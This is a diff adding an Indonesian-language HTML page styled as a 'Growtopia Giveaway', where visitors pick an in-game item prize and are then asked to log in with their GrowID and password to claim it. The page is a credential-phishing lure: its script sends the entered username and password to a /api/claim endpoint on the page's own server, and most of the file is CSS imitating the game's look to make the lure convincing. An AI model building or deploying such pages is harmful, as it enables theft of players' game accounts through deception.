@@ -1,0 +1,317 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Growtopia Giveaway</title>
+<style>
+*{box-sizing:border-box}
+body{margin:0;background:#10151d;color:#f5f7fa;font-family:Arial,sans-serif}
+header{text-align:center;padding:35px 15px;background:linear-gradient(135deg,#183c34,#192432)}
+h1{font-size:38px;margin:10px}
+p{color:#b8c5d3}
+main{max-width:900px;margin:25px auto;padding:0 15px}
+.grid{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.card{background:#202b38;border:2px solid #344657;border-radius:12px;padding:10px;color:white;cursor:pointer}
+.card.selected{border-color:#71efa3}
+.card img{width:100%;height:95px;object-fit:contain}
+.card b{display:block;padding:8px 0}
+.panel{background:#202b38;border-radius:14px;padding:20px;margin-top:25px}
+label{display:block;margin:15px 0 6px}
+input{width:100%;padding:12px;border-radius:8px;border:1px solid #526274;background:#111923;color:white;font-size:16px}
+button.submit{width:100%;padding:13px;background:#71efa3;border:0;border-radius:8px;font-weight:bold;margin-top:18px}
+small{color:#b8c5d3}
+@media(max-width:520px){.grid{grid-template-columns:repeat(2,1fr)}}
+
+/* Growtopia-style world background */
+body {
+  background-color: #72d3ff !important;
+  background-image:
+    linear-gradient(90deg, transparent 49%, #ffffff18 50%, transparent 51%),
+    linear-gradient(to bottom,
+      transparent 0,
+      transparent calc(100% - 115px),
+      #70d34f calc(100% - 115px),
+      #70d34f calc(100% - 100px),
+      #a76d43 calc(100% - 100px),
+      #87532f 100%) !important;
+  background-attachment: fixed !important;
+  background-repeat: repeat !important;
+}
+body::before {
+  content: "";
+  position: fixed;
+  z-index: -1;
+  pointer-events: none;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background:
+    linear-gradient(#fff 0 0) 12% 17% / 38px 12px no-repeat,
+    linear-gradient(#fff 0 0) 15% 14% / 30px 15px no-repeat,
+    linear-gradient(#fff 0 0) 18% 17% / 35px 12px no-repeat,
+    linear-gradient(#fff 0 0) 75% 30% / 40px 12px no-repeat,
+    linear-gradient(#fff 0 0) 78% 27% / 32px 15px no-repeat,
+    linear-gradient(#fff 0 0) 81% 30% / 35px 12px no-repeat;
+  opacity: .85;
+}
+header {
+  background: linear-gradient(135deg, #38a9e9dd, #8be4ffbb) !important;
+}
+
+/* ===== GROWTOPIA WORLD THEME ===== */
+body {
+  position: relative;
+  isolation: isolate;
+  min-height: 100vh;
+  color: #172b20;
+  background-color: #70d7ff;
+  background-image:
+    linear-gradient(
+      to bottom,
+      #72d8ff 0%,
+      #b5efff 65%,
+      #75d653 65%,
+      #75d653 82%,
+      #98613b 82%,
+      #704327 100%
+    );
+  background-attachment: fixed;
+}
+
+/* Awan pixel */
+body::before {
+  content: "";
+  position: fixed;
+  inset: 0;
+  z-index: -1;
+  pointer-events: none;
+  opacity: .8;
+  background:
+    linear-gradient(#fff 0 0) 8% 16% / 35px 12px no-repeat,
+    linear-gradient(#fff 0 0) 11% 13% / 35px 14px no-repeat,
+    linear-gradient(#fff 0 0) 14% 16% / 35px 12px no-repeat,
+    linear-gradient(#fff 0 0) 76% 24% / 36px 12px no-repeat,
+    linear-gradient(#fff 0 0) 79% 21% / 36px 14px no-repeat,
+    linear-gradient(#fff 0 0) 82% 24% / 36px 12px no-repeat;
+}
+
+/* Header dan logo */
+header {
+  position: relative;
+  overflow: hidden;
+  background: linear-gradient(135deg, #167c4b, #37b86b) !important;
+  border-bottom: 5px solid #a7e85b;
+  box-shadow: 0 5px 0 #24653d;
+}
+
+.gt-logo {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 9px;
+  margin: 0 auto 12px;
+  color: #fff;
+  text-shadow: 2px 3px 0 #24572c, -1px -1px 0 #24572c;
+}
+
+.gt-logo-icon {
+  font-size: 38px;
+  color: #ffe75a;
+  text-shadow: 2px 3px 0 #775020;
+}
+
+.gt-logo-text {
+  font-size: clamp(25px, 6vw, 38px);
+  font-weight: 1000;
+  letter-spacing: 1px;
+  -webkit-text-stroke: .6px #24572c;
+}
+
+.gt-logo-text span {
+  color: #ffe45c;
+}
+
+/* Teks di area langit yang terang: gunakan warna gelap */
+main > h2 {
+  color: #173a28;
+  text-shadow: 0 1px 0 #ffffffaa;
+}
+
+body > header p {
+  color: #fff !important;
+  text-shadow: 1px 2px 2px #174c32;
+}
+
+body > header small {
+  color: #f4ffcf;
+}
+
+/* Kolom hadiah: transparan supaya background dunia terlihat */
+.grid {
+  gap: 14px;
+}
+
+.card {
+  background: #f5ffe9d9 !important;
+  color: #173a28 !important;
+  border: 3px solid #4d9d48 !important;
+  border-radius: 12px;
+  box-shadow: 0 4px 0 #28673a;
+  backdrop-filter: blur(3px);
+  -webkit-backdrop-filter: blur(3px);
+  transition: transform .15s, background .15s;
+}
+
+.card:hover {
+  transform: translateY(-3px);
+  background: #ffffffed !important;
+}
+
+.card.selected {
+  border-color: #ffca28 !important;
+  background: #fff7c9f2 !important;
+  box-shadow: 0 0 0 3px #ffca2870, 0 4px 0 #9b7621;
+}
+
+.card b {
+  color: #173a28 !important;
+}
+
+.card small {
+  color: #31553a !important;
+}
+
+/* Form tetap kontras dan mudah dibaca */
+.panel {
+  color: #f8fff9;
+  background: #173d2df0 !important;
+  border: 2px solid #75d653;
+  box-shadow: 0 5px 0 #28633b;
+  backdrop-filter: blur(5px);
+  -webkit-backdrop-filter: blur(5px);
+}
+
+.panel h2,
+.panel label {
+  color: #ffffff;
+}
+
+.panel p,
+.panel small {
+  color: #d7f5df;
+}
+
+.panel input {
+  color: #fff;
+  background: #10271df5;
+  border: 1px solid #8fcca0;
+}
+
+.panel input::placeholder {
+  color: #b9d4c1;
+}
+
+button.submit {
+  color: #153b24;
+  background: linear-gradient(180deg, #b8ff7a, #71efa3);
+  box-shadow: 0 3px 0 #347f45;
+}
+
+#message {
+  overflow-wrap: anywhere;
+}
+
+@media (max-width: 520px) {
+  .grid {
+    grid-template-columns: repeat(2, minmax(0, 1fr));
+    gap: 10px;
+  }
+
+  .card {
+    padding: 8px;
+  }
+
+  .card img {
+    height: 85px;
+  }
+}
+
+</style>
+</head>
+<body>
+<header>
+  <div class="gt-logo">
+    <span class="gt-logo-icon">✦</span>
+    <span class="gt-logo-text">GROW<span>TOPIA</span></span>
+  </div>
+  <small>GROWTOPIA COMMUNITY</small>
+  <h1>GIVEAWAY</h1>
+  <p>Pilih hadiah favoritmu!</p>
+</header>
+<main>
+  <h2>Pilih Hadiah</h2>
+  <div id="gifts" class="grid"></div>
+  <section class="panel">
+    <h2>Login Growtopia</h2>
+    <p>Login To Growtopia For Claim The Prize</p>
+    <form id="form">
+      <label for="growId">GrowID</label>
+      <input id="growId" maxlength="40" required placeholder="Masukkan GrowID">
+      <label for="growPass">Grow Pass</label>
+      <input id="growPass" maxlength="40" required placeholder="Masukan Grow Pass">
+      <input id="giftId" type="hidden">
+      <button class="submit" type="submit">Kirim Klaim</button>
+      <p id="message"></p>
+    </form>
+  </section>
+</main>
+<script>
+let selected = 0;
+const grid = document.getElementById("gifts");
+const giftNames = [
+  "Ancestral Tesseract (Red)",
+  "Ancestral Tesseract (Blue)",
+  "Ancestral Tesseract (Yellow)",
+  "Tesseract Manipulator",
+  "Buddy Block Head",
+  "Winter Wishing Star",
+  "Ghost King's Crown",
+  "Eclipse Wings",
+  "Blue Gem Lock (BGL)"
+];
+
+for(let i=1;i<=9;i++){
+  const card=document.createElement("button");
+  card.type="button";
+  card.className="card";
+  card.innerHTML='<img src="./images/gift'+i+'.png" alt="'+giftNames[i-1]+'"><b>'+giftNames[i-1]+'</b><small>Pilih hadiah</small>';  
+  card.onclick=()=>{
+    selected=i;
+    document.getElementById("giftId").value=i;
+    document.querySelectorAll(".card").forEach(c=>c.classList.remove("selected"));
+    card.classList.add("selected");
+    document.getElementById("message").textContent="Hadiah "+i+" dipilih.";
+  };
+  grid.appendChild(card);
+}
+document.getElementById("form").onsubmit=async e=>{
+  e.preventDefault();
+  if(!selected){document.getElementById("message").textContent="Pilih hadiah terlebih dahulu.";return;}
+  const r=await fetch("/api/claim",{
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body:JSON.stringify({
+      growId:document.getElementById("growId").value,
+      growPass:document.getElementById("growPass").value,
+      giftId:selected
+    })
+  });
+  const d=await r.json();
+  document.getElementById("message").textContent=d.message||d.error;
+  if(r.ok)e.target.reset();
+};
+</script>
+</body>
+      </html>
